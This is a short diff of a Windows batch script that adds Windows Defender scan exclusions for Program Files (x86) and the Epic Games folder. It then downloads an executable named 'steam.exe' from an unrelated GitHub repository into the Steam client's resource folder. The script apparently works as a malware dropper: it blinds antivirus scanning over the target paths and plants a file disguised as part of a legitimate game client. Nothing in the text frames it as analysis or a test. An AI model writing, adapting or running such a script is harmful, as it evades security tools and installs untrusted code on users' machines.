@@ -1,6 +1,6 @@
 @echo off
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
-powershell -Command "C:\Program Files (x86)\Epic Games"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Epic Games'"
 
 :: Download files using PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
